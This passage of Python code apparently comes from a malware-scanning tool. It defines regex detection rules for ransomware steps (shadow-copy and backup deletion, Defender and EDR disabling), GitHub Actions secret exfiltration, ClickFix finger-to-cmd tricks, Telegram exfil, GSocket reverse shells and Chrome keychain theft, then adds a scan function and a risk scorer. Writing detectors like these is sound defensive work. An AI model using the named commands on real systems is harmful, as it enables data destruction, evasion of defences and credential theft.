     "pattern": r"\b\w{3,20}\.exe\b[^\n]{0,200}\b(?:event|version|dbghelp|winhttp|dbgcore|iertutil|loghelp|profapi|sqlite3|winmm|ffmpeg)\.dll\b",
     "desc": "Executable co-located with commonly-sideloaded DLL name (T1574.001)"},
    {"rule": "Sandbox_Username_String_Check", "severity": "medium",
     "pattern": r"(?:username|computername|hostname|user[\s_-]?name)[^\n]{0,80}?(?:\bsandbox\b|\bhoney(?:pot)?\b|\bvmware\b|\bVBox\b|\bQEMU\b|\bCuckoo\b|\banalyst\b|\bany\.?run\b|\btriage\b)",
     "desc": "Anti-analysis: username/host string comparison against sandbox/VM indicators"},
    {"rule": "Analysis_Tool_Process_Enum", "severity": "medium",
     "pattern": r"\b(?:x64dbg|x32dbg|ida64|windbg|ollydbg|binaryninja|cutter|frida|wireshark|fiddler|tcpdump|dumpcap|mitmdump|httpdebugger|fakenet|inetsim|processhacker|ksdumper|apimonitor|dynamorio)\.exe\b",
     "desc": "Analysis-tool process enumeration — debuggers/RE/network-analysis (T1057 anti-analysis)"},
    {"rule": "Virtualization_Driver_Enum", "severity": "medium",
     "pattern": r"\b(?:vmhgfs|vmci|vmmouse|vm3dmp|vboxguest|vboxsf|vboxvideo|prleth|prlfs|prlmouse)\.sys\b",
     "desc": "Enumeration of virtualization driver .sys files (VM detection)"},
    {"rule": "Overlord_RAT_Mutex", "severity": "high",
     "pattern": r"Overlord-[A-Za-z0-9]{18,24}_[CS]",
     "desc": "Overlord RAT mutex pattern — family classifier"},
    {"rule": "Donut_Loader_Signature", "severity": "high",
     "pattern": r"\b(?:donut|shellcode[-_]?runner)\b[^\n]{0,200}?(?:VirtualAlloc(?:Ex)?|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx)",
     "desc": "Donut-loader in-memory PE execution signature"},
    {"rule": "RC4_Decrypt_Routine", "severity": "medium",
     "pattern": r"\bRC4(?:Decrypt|Init|Crypt)\b|InitRC4Ctx",
     "desc": "RC4 decryption routine reference — encrypted-shellcode staging"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · ControlR RMM + Google Sheets C2
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "ControlR_RMM_Abuse", "severity": "high",
     "pattern": r"\bdemo\.controlr\.app\b|ControlR\.Agent\.Installer|-TenantId\s+[a-f0-9\-]{20,}",
     "desc": "ControlR remote-management tool abuse (APT36 ShadowRecruit tradecraft) — MITRE T1219"},
    {"rule": "Google_Sheets_C2", "severity": "high",
     "pattern": r"https?://sheets\.googleapis\.com/v4/spreadsheets/[A-Za-z0-9_\-]{20,}",
     "desc": "Google Sheets API endpoint — legit-infra C2 channel (SheetAgent tradecraft)"},
    {"rule": "Google_Service_Account_Credentials", "severity": "high",
     "pattern": r"[\"']?service_account[\"']?\s*[:=]\s*[\"'][a-z0-9\-]+@[a-z0-9\-]+\.iam\.gserviceaccount\.com[\"']|[\"']?private_key_id[\"']\s*:\s*[\"'][a-f0-9]{20,}[\"']",
     "desc": "Google service-account credentials embedded in payload (T1552.001)"},
    {"rule": "Scheduled_Task_Defender_Masquerade", "severity": "high",
     "pattern": r"schtasks(?:\.exe)?\s+/create\s+.*?/tn\s+[\"']?(?:WindowsDefenderSync|WinSyncDefender|DefenderSyncService|MicrosoftUpdateSync|WindowsNetlogonSync)",
     "desc": "Scheduled Task masquerading as Windows Defender/Update service (T1053.005)"},
    {"rule": "Startup_Folder_LNK_Persistence", "severity": "medium",
     "pattern": r"(?:%APPDATA%|AppData\\Roaming)\\Microsoft\\Windows\\Start\s+Menu\\Programs\\Startup\\[^\\/\s]{1,60}\.lnk",
     "desc": "Startup folder .lnk shortcut persistence (T1547.001)"},
    {"rule": "HKCU_Run_Key_Persistence", "severity": "medium",
     "pattern": r"(?:HKCU|HKEY_CURRENT_USER)\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[A-Za-z_][A-Za-z0-9_]*",
     "desc": "HKCU Run key persistence (T1547.001)"},
    {"rule": "LNK_Icon_Impersonation", "severity": "high",
     "pattern": r"IconLocation\s*=\s*[\"']?[^\"'\n]{0,120}?(?:msedge|iexplore|chrome|firefox|acrobat)\.exe",
     "desc": "LNK IconLocation impersonating browser/PDF-reader — social-engineering lure (T1036.005)"},
    {"rule": "Cleanup_Bat_Self_Delete", "severity": "medium",
     "pattern": r"cleanup\.bat[^\n]{0,200}?(?:del|erase|rd)\s+/[qs]\s+[\"']?%~dp0|timeout\s+/t\s+\d+\s+&&?\s+del\s+.*?service\.json",
     "desc": "cleanup.bat self-delete + config wipe (SheetAgent/APT36 tradecraft)"},
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.2.0 · Illicit OAuth consent scopes
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "OAuth_Overscoped_Consent", "severity": "high",
     "pattern": r"scope=(?:Mail\.Read|Mail\.ReadWrite|Files\.ReadWrite\.All|Directory\.Read\.All|User\.Read\.All|Sites\.ReadWrite\.All|Chat\.ReadWrite)",
     "desc": "Over-scoped OAuth consent (Mail.*/Files.*/Directory.*/Chat.*) — illicit-consent phish (MITRE T1550.001)"},
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · LegacyHive — Windows userprofile-service
    # arbitrary hive load EoP (CVE-adjacent, published Jul 2026)
    # Ref: https://github.com/MSNightmare/LegacyHive
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "LegacyHive_EoP_Marker", "severity": "high",
     "pattern": r"\bLegacyHive(?:\.exe|\.cpp)?\b",
     "desc": "LegacyHive EoP PoC binary/name — Windows userprofile-service arbitrary hive load (T1068)"},
    {"rule": "Usrclass_Dat_Unusual_Load", "severity": "high",
     "pattern": r"\bRegLoadKey\w*\s*\(|\bRegLoadAppKey\s*\(|\bNtLoadKey\w*\s*\([^\)]*usrclass\.dat|"
     r"usrclass\.dat[^\n]{0,80}?(?:reg\s+load|RegLoadKey|LoadHive|NtLoadKey)",
     "desc": "usrclass.dat hive-load via RegLoadKey/NtLoadKey — LegacyHive-style EoP"},
    {"rule": "Registry_Arbitrary_Hive_Load", "severity": "high",
     "pattern": r"reg(?:\.exe)?\s+load\s+HK(?:CU|LM|CR)\\[^\s]+\s+[a-z]:\\[^\s]+\.(?:dat|hiv|hive)\b",
     "desc": "reg load — arbitrary hive-file mount into registry (EoP tradecraft)"},
    {"rule": "UserProfileSvc_Hive_Mount", "severity": "high",
     "pattern": r"ProfSvc|UserProfileService|LoadUserProfile|CreateProfile\w*\s*\(",
     "desc": "User Profile Service hive-mount API — LegacyHive/CVE-class EoP surface"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Finger protocol ClickFix
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "Finger_Piped_To_Cmd", "severity": "high",
     "pattern": r"\bfinger(?:\.exe)?\s+[A-Za-z0-9_.\-]+@[A-Za-z0-9.\-]+\s*\|\s*cmd",
     "desc": "finger user@host | cmd — ClickFix remote-script LOLBIN abuse (BleepingComputer Nov 2025)"},
    {"rule": "Finger_URI_Scheme", "severity": "medium",
     "pattern": r"finger://[A-Za-z0-9.\-]+",
     "desc": "finger:// URI — TCP/79 remote script retrieval (T1071)"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · GitHub Actions supply-chain
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "GHA_pull_request_target", "severity": "high",
     "pattern": r"on:\s*pull_request_target\b|pull_request_target:\s*",
     "desc": "GitHub Actions pull_request_target trigger — dangerous unless carefully scoped (Wiz M&M)"},
    {"rule": "GHA_Unpinned_Action_Ref", "severity": "medium",
     "pattern": r"uses:\s+[A-Za-z0-9_\-]+/[A-Za-z0-9_\-]+@(?:main|master|dev)\b",
     "desc": "GitHub Action reference pinned to a mutable branch (@main/@master/@dev)"},
    {"rule": "GHA_Secret_Exfil", "severity": "high",
     "pattern": r"(?:secrets\.[A-Z_]+|GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN)[^\n]{0,300}?(?:curl|wget|nc|bash|python|node)\s+.*?https?://",
     "desc": "GitHub Actions secret piped to network exfil command"},
    {"rule": "GHA_Checkout_Attacker_SHA", "severity": "high",
     "pattern": r"actions/checkout@[^\s]*\s+.*?ref:\s+\$\{\{\s*github\.event\.pull_request\.head\.sha",
     "desc": "actions/checkout with attacker-controlled PR head SHA (Wiz M&M supply-chain tradecraft)"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · npm supply-chain (Socket Jscrambler)
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "NPM_Postinstall_Script", "severity": "medium",
     "pattern": r"[\"']postinstall[\"']\s*:\s*[\"'](?:node|npm|npx|curl|wget|bash|sh|python)\s+",
     "desc": "npm postinstall hook running arbitrary command (JS supply-chain risk)"},
    {"rule": "NPM_Allow_Scripts_Install", "severity": "medium",
     "pattern": r"npm\s+(?:install|i)\s+.*?--(?:ignore-scripts=false|allow-scripts)",
     "desc": "npm install with explicit script-enabling flag"},
    {"rule": "JS_Obfuscator_Tool", "severity": "medium",
     "pattern": r"\b(?:jscrambler|obfuscator\.io|javascript-obfuscator)\b[^\n]{0,80}?(?:transform|obfuscate|encode)",
     "desc": "JavaScript obfuscation tool signature (Jscrambler / obfuscator.io / javascript-obfuscator)"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Ransomware EDR-disable + recovery-kill
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "Defender_Set_MpPreference_Disable", "severity": "high",
     "pattern": r"Set-MpPreference\s+.*?-(?:DisableRealtimeMonitoring|DisableIOAVProtection|DisableBehaviorMonitoring|DisableScriptScanning|DisableIntrusionPreventionSystem|DisableBlockAtFirstSeen)\s+\$true",
     "desc": "Windows Defender feature disabled via Set-MpPreference (MITRE T1562.001)"},
    {"rule": "EDR_AV_Process_Kill", "severity": "high",
     "pattern": r"(?:taskkill|Stop-Process)[^\n]{0,60}?/(?:IM|Name)\s+(?:MsMpEng|CSFalconService|SentinelAgent|MBAMService|WinDefend|CylanceSvc|BDServicesHost|EPProtectedService|ekrn|avast|avg|kaspersky|sophos|carbonblack)",
     "desc": "taskkill/Stop-Process targeting known EDR/AV daemons — pre-encryption stage (MITRE T1562.001)"},
    {"rule": "SC_Stop_Security_Service", "severity": "high",
     "pattern": r"sc(?:\.exe)?\s+(?:stop|delete|config)\s+(?:WinDefend|MpKsl|Sense|CSFalconService|SentinelAgent|MBAMService|CylanceSvc|BDESVC|MpsSvc|WdNisSvc)",
     "desc": "sc.exe stop/delete/config on Windows security service (MITRE T1562.001)"},
    {"rule": "Event_Log_Clear", "severity": "high",
     "pattern": r"wevtutil\s+(?:cl|clear-log)\s+(?:System|Security|Application|Microsoft-Windows-[A-Za-z\-]+)|Clear-EventLog\s+-LogName",
     "desc": "Windows Event Log clearing (MITRE T1070.001)"},
    {"rule": "Volume_Shadow_Copy_Delete", "severity": "high",
     "pattern": r"vssadmin(?:\.exe)?\s+delete\s+shadows\b|wmic\s+shadowcopy\s+delete\b|Win32_Shadowcopy.*?\.Delete\(\)",
     "desc": "Delete Volume Shadow Copies — canonical ransomware pre-encrypt step (MITRE T1490)"},
    {"rule": "BCDEdit_Disable_Recovery", "severity": "high",
     "pattern": r"bcdedit(?:\.exe)?\s+/set\s+.*?(?:bootstatuspolicy\s+ignoreallfailures|recoveryenabled\s+no)",
     "desc": "bcdedit disabling Windows Recovery Environment (MITRE T1490)"},
    {"rule": "WBAdmin_Delete_Backup", "severity": "high",
     "pattern": r"wbadmin(?:\.exe)?\s+delete\s+(?:catalog|backup|systemstatebackup)",
     "desc": "wbadmin delete backup/catalog — ransomware pre-encrypt (MITRE T1490)"},
    {"rule": "Everest_Ransomware_Marker", "severity": "high",
     "pattern": r"\bEverest[_\-]?(?:Locker|Ransom|Team)\b|README_TO_RESTORE\.(?:txt|html)|_HOW_TO_RECOVERY_FILES_",
     "desc": "Everest ransomware family marker (ransom-note / group tag)"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Gamarue/Andromeda worm
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "Gamarue_Andromeda_Autorun", "severity": "high",
     "pattern": r"autorun\.inf[^\n]{0,80}?open\s*=|\bandromeda\b|\bgamarue\b|\bWauchos\b",
     "desc": "Gamarue/Andromeda autorun.inf USB worm marker (RedCanary threat report)"},
    {"rule": "Rundll32_Gamarue_Exports", "severity": "medium",
     "pattern": r"rundll32(?:\.exe)?\s+.*?,\s*(?:AndromedaEntry|SetupObject|_bo\d+|Install|DllInstall)",
     "desc": "Rundll32 invoking Gamarue-family export functions"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · VMware ESXi hypervisor exploit
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "ESXi_esxcli_Command", "severity": "medium",
     "pattern": r"\besxcli\s+(?:vm|network|storage|system)\s+",
     "desc": "esxcli command — VMware ESXi hypervisor post-exploitation"},
    {"rule": "ESXi_vim_cmd", "severity": "high",
     "pattern": r"\bvim-cmd\s+(?:vmsvc|hostsvc|solo)/",
     "desc": "vim-cmd — VM lifecycle manipulation from ESXi hypervisor"},
    {"rule": "ESXi_AD_Admin_Group_Escalation", "severity": "high",
     "pattern": r"ESX\s+Admins?\b|CVE-2024-37085",
     "desc": "ESXi 'ESX Admins' AD-group escalation (CVE-2024-37085)"},
    {"rule": "ESXi_VM_Snapshot_Destroy", "severity": "high",
     "pattern": r"vmsvc/(?:snapshot|power\.off|unregister|destroy)\.(?:create|remove)",
     "desc": "ESXi VM snapshot/unregister/destroy from hypervisor (ransomware target)"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · TrendMicro Patriot Bait (AI-built C&C)
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "PatriotBait_API_Endpoint", "severity": "high",
     "pattern": r"/api/v1/(?:update|telemetry|agents|interact)\b",
     "desc": "AI-generated C&C API endpoint (Patriot Bait /api/v1/*) — TrendMicro Jul 2026"},
    {"rule": "PatriotBait_XAgentID_Header", "severity": "high",
     "pattern": r"X-Agent-ID\s*:\s*(?:\$env:COMPUTERNAME|[^\n]{0,60}?_[A-Za-z0-9]+)",
     "desc": "Custom X-Agent-ID HTTP header — Patriot Bait beacon signature"},
    {"rule": "PatriotBait_5Sec_Polling", "severity": "high",
     "pattern": r"Start-Sleep\s+-Seconds?\s+5[^\n]{0,120}?Invoke-WebRequest.*?/api/v1/",
     "desc": "PowerShell 5-second polling loop to /api/v1/ — AI botnet beacon"},
    {"rule": "PatriotBait_Svchost_Path", "severity": "high",
     "pattern": r"(?:%APPDATA%|AppData\\Roaming)\\Microsoft\\Windows\\Runtime\\svchost\.exe",
     "desc": "svchost.exe in non-standard Runtime path — Patriot Bait persistence"},
    {"rule": "PatriotBait_WMI_Filter", "severity": "high",
     "pattern": r"Win32_PerfFormattedData_PerfOS_System",
     "desc": "WMI Event Subscription filter on PerfOS_System (Patriot Bait persistence)"},
    {"rule": "PatriotBait_Temp_Payload", "severity": "high",
     "pattern": r"(?:%TEMP%|Temp)\\win_update_svc_[A-Za-z0-9]+\.ps1",
     "desc": "win_update_svc_*.ps1 in %TEMP% — Patriot Bait payload marker"},
    {"rule": "UserInitMprLogonScript_Persistence", "severity": "high",
     "pattern": r"(?:HKCU|HKEY_CURRENT_USER):?\\Environment\\UserInitMprLogonScript",
     "desc": "UserInitMprLogonScript registry persistence — non-admin logon-script (T1037.001)"},
    {"rule": "OneDrive_Update_Task_Masquerade", "severity": "high",
     "pattern": r"OneDrive\s+Standalone\s+Update\s+Task-S-1-5-21-",
     "desc": "Scheduled Task masquerade as OneDrive Standalone Update — Patriot Bait persistence"},
    {"rule": "AI_Skill_File_Markers", "severity": "medium",
     "pattern": r"\b(?:GEMINI\.md|SKILL\.md|C2_MIGRATION_GUIDE\.md)\b",
     "desc": "AI skill-file naming pattern (GEMINI.md / SKILL.md / C2_MIGRATION_GUIDE.md) — Patriot Bait"},

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · ClickLock macOS ClickFix stealer
    # ═══════════════════════════════════════════════════════════════════
    {"rule": "ClickLock_LaunchAgent", "severity": "high",
     "pattern": r"com\.(?:authirity|chromer)\.plist",
     "desc": "ClickLock macOS LaunchAgent plist (com.authirity / com.chromer)"},
    {"rule": "macOS_Forced_Password_Dialog_Loop", "severity": "high",
     "pattern": r"(?:while|repeat)[^\n]{0,80}?(?:osascript|do\s+shell\s+script)[^\n]{0,120}?display\s+dialog[^\n]{0,120}?(?:password|Keychain|Chrome\s+Safe\s+Storage)",
     "desc": "macOS forced-password-dialog loop — ClickLock coercion tradecraft"},
    {"rule": "macOS_Process_Kill_Loop", "severity": "high",
     "pattern": r"(?:killall|pkill)\s+.*?(?:Finder|Dock|Activity\s+Monitor|Console|System\s+Settings|Spotlight)[^\n]{0,120}?(?:sleep\s+0\.[0-9]+|osascript)",
     "desc": "macOS process-kill loop (Finder/Dock/Activity Monitor/...) — ClickLock coercion cycle"},
    {"rule": "Chrome_SafeStorage_Keychain_Access", "severity": "high",
     "pattern": r"security\s+find-generic-password\s+.*?Chrome\s+Safe\s+Storage|\bChrome\s+Safe\s+Storage\s+key\b",
     "desc": "Chrome Safe Storage key access via macOS Keychain (ClickLock decrypt-passwords tradecraft)"},
    {"rule": "Fake_Cloudflare_Terminal_Captcha", "severity": "high",
     "pattern": r"(?:Verifying\s+you\s+are\s+human|Cloudflare\s+security\s+check|[▓█▒░]{10,})",
     "desc": "Fake Cloudflare human-verification terminal progress-bar — ClickFix (Windows + macOS)"},
    {"rule": "Telegram_Bot_API_Exfil", "severity": "high",
     "pattern": r"https?://api\.telegram\.org/bot[0-9]+:[A-Za-z0-9_\-]{20,}/(?:sendDocument|sendMessage|sendPhoto)",
     "desc": "Telegram Bot API exfil endpoint (ClickLock / Amos / StealC / Lumma)"},
    {"rule": "GSocket_Relay_Backdoor", "severity": "high",
     "pattern": r"\bgsocket\b|\bgs-netcat\b|gs\.uk/y",
     "desc": "GSocket relay-based reverse-shell backdoor (ClickLock persistent RAT module)"},
    {"rule": "NotificationCenter_Suppression", "severity": "medium",
     "pattern": r"killall\s+NotificationCenter\b|launchctl\s+kickstart\s+.*?com\.apple\.notificationcenterui",
     "desc": "NotificationCenter killed — macOS covert operation (ClickLock hides system alerts)"},
]


def yara_lite_scan(text: str) -> List[Dict[str, str]]:
    hits = []
    for r in YARA_LITE:
        m = re.search(r["pattern"], text, re.IGNORECASE)
        if m:
            hits.append({"rule": r["rule"], "severity": r["severity"], "match": m.group(0)[:120], "description": r["desc"]})
    return hits


def risk_score(mitre: List[Dict], yara: List[Dict], iocs: Dict[str, List[str]]) -> Dict[str, Any]:
    score = 0
    weights = {"high": 25, "medium": 12, "low": 4}
    for y in yara:
        score += weights.get(y["severity"], 0)
    score += 5 * len(mitre)
    if iocs.get("urls"): score += 6
    if iocs.get("ips"): score += 4
    if iocs.get("bitcoin_addresses"): score += 15
    score = min(score, 100)
    if score >= 70:
        verdict, level = "Malicious", "high"
    elif score >= 40:
        verdict, level = "Suspicious", "medium"
    elif score >= 15:
        verdict, level = "Low Risk", "low"
    else:
        verdict, level = "Benign", "safe"
    return {"score": score, "verdict": verdict, "level": level}
